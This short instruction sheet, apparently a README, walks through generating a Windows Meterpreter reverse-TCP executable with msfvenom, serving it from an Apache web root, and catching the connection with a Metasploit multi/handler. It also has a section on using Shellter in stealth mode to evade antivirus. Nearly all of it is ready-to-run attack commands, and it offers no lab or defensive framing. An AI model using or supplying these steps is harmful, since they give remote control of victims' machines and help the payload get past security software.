## Instructions:
  ### On the host machine (linux): // Note: (change 192.168.0.24 to your ip, and 8080 to the port you desire)
   1.  msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows LHOST=192.168.0.24 LPORT=8080 -f exe > shell.exe   
   2.  cp shell.exe /var/www/html
   2.1 . OPTIONAL go to Avoiding AntiVirus
   3.  service apache2 start
   3.  msfconsole
   4.  use exploit/multi/handler
   5.  set PAYLOAD windows/meterpreter/reverse_tcp
   6.  set LHOST 192.168.0.24
   7.  set LPORT 8080
   8.  exploit
   
   ### Avoiding Anti Virus
    1. sudo apt-get install shellter [ You might be required to install wine32 first (dpkg --add-architecture i386 && apt-get update && apt-get install wine32) ]
    2. shellter
    3. A (to select AUTO)
    4. /var/www/htmlEnter path to your executable
    5. Y (to enter stealth mode)
    6. Enter LHOST and LPORT
